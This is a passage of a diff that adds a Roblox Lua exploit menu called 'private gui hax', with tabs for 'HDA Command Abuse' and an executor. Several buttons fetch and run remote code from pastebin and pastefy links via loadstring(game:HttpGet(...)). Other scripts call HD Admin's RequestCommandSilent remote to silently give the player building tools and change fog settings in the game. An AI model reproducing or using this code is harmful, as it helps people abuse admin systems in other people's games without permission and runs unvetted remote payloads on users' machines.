+	
+	
+		local Players = game:GetService("Players")
+	
+		local mouse = Players.LocalPlayer:GetMouse()
+	
+		mouse.Icon = "http://www.roblox.com/asset?id=6776562421"
+	end)
+end;
+task.spawn(C_2e4);
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+function C_2e6()
+local script = G2L["2e6"];
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/bkQpfefP"))()
+	end)
+end;
+task.spawn(C_2e6);
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+function C_2e8()
+local script = G2L["2e8"];
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastefy.app/A8qUd3sK/raw"))()
+	end)
+end;
+task.spawn(C_2e8);
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+function C_2ea()
+local script = G2L["2ea"];
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastefy.app/XWt3hqXA/raw"))()
+	end)
+end;
+task.spawn(C_2ea);
+-- StarterGui.private gui hax.lol.Gui tab.LocalScript
+function C_30d()
+local script = G2L["30d"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.HomePage.Visible = false
+		script.Parent.Parent.F3XtabPage.Visible = false
+		script.Parent.Parent["HDA Command Abuse tab Page"].Visible = false
+		script.Parent.Parent["LocalPlayer tab Page"].Visible = false
+		script.Parent.Parent["Audio tab Page"].Visible = false
+		script.Parent.Parent["Executor tab Page"].Visible = false
+		script.Parent.Parent["ScriptHub F3X Page"].Visible = false
+		script.Parent.Parent["Credit tab Page"].Visible = false
+		script.Parent.Parent["HD Abuse 2 tab Page"].Visible = false
+		script.Parent.Parent["Gui Page"].Visible = true
+	end)
+end;
+task.spawn(C_30d);
+-- StarterGui.private gui hax.lol.R15.LocalScript
+function C_30f()
+local script = G2L["30f"];
+	script.Parent.MouseButton1Click:Connect(function()
+			local ReplicatedStorage = game:GetService("ReplicatedStorage")
+			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+			RequestCommand:InvokeServer(";r15 me")
+	end)
+end;
+task.spawn(C_30f);
+-- StarterGui.private gui hax.open/close.scriptforit
+function C_311()
+local script = G2L["311"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.lol.Visible = not script.Parent.Parent.lol.Visible
+	end)
+end;
+task.spawn(C_311);
+-- StarterGui.private gui hax.open/close.script
+function C_312()
+local script = G2L["312"];
+	local trajectory = script.Parent
+	
+	while wait(0.005) do
+		trajectory.Rotation = trajectory.Rotation + 1
+	end
+end;
+task.spawn(C_312);
+-- StarterGui.private gui hax.requestbtool
+function C_313()
+local script = G2L["313"];
+	local player = game.Players.LocalPlayer
+	local replicatedStorage = game:GetService("ReplicatedStorage")
+	
+	local remote = replicatedStorage:FindFirstChild("HDAdminHDClient")
+	if remote then
+		remote = remote:FindFirstChild("Signals")
+		if remote then
+			remote = remote:FindFirstChild("RequestCommandSilent")
+		end
+	end
+	
+	if not remote then
+		return
+	end
+	
+	local function broohacker(command)
+		pcall(function()
+			remote:InvokeServer(command)
+		end)
+	end
+	
+	broohacker(";btools me")
+	broohacker(";fogcolor black")
+	
+	player.CharacterAdded:Connect(function(character)
+		task.wait(0.5)
+		if not player.Backpack:FindFirstChild("Building Tools") then
+			task.spawn(function()
+				broohacker(";btools")
+				broohacker(";fogcolor black")
+				broohacker(";unfog")
+			end)
+		end
+	end)
+end;
+task.spawn(C_313);
+
+return G2L["1"], require;
